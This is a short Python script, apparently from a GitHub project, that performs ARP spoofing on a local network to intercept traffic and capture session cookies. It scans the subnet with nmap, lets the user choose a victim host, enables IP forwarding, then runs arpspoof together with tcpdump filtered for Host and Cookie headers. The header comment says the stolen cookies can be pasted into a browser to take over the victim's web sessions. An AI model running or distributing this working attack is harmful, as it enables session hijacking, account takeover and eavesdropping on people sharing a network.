# https://github.com/kimdo331/2019-Police-Project
# Usage: python3 hijacking.https.py
# Explanation: This script will capture Session-Cookie Info from any computers in the same LAN. Once captured, you can copy it to chrome browser and access the website
#              using the session-cookie

import os
import nmap

def scan(network_id):
	nm = nmap.PortScanner()
	res = nm.scan(hosts=f'{network_id}.0/24', arguments = '-sP')
	return res

def ip_print(res):
	ip_list = []
	for x in res['scan'].keys():
		list_tmp = [x]
		print(x, end='\t')
		try:
			print(list(res['scan'][x]['vendor'].keys())[0], list(res['scan'][x]['vendor'].values())[0], sep = '\t')
			list_tmp.append(list(res['scan'][x]['vendor'].keys())[0])
			list_tmp.append(list(res['scan'][x]['vendor'].values())[0])
		except:
			print()
		ip_list.append(list_tmp)
#	print(ip_list)
#	print(res)
	return ip_list

def spoof_dump(interface_name, network_id, target_ip):
	os.system(f"arpspoof -i {interface_name} -t {target_ip} {network_id}.1 & "\
	+f'tcpdump -l -v -i {interface_name} | grep -E "Host|Cookie"')
	
import os

network_id = '192.168.50'
#network_id = '192.168.123'
interface_name = 'wlan0'

def logprint(log_str):
	print('-'*5, log_str, '-'*5, sep='')

os.system('./01_ip_forwarding_on')
logprint('IP FORWARDING ON')

logprint('IP SCAN START')
res = scan(network_id)
logprint('IP SCAN FINISH')
ip_list = ip_print(res)

logprint('SELECT IP')
for i in range(len(ip_list)):
	print(i, ip_list[i])
i = int(input())
selected = ip_list[i]

logprint('target INFORMATION')
try:
	print('ip', selected[0], sep='\t')
	print('mac', selected[1], sep='\t')
	print('corporation', selected[2], sep='\t')
except:
	pass

logprint('ARP SPOOFING READY\nPRESS "1" to start attack')
if(int(input()) != 1):
	print("attack stopped")
	exit()

spoof_dump(interface_name, network_id, selected[0])
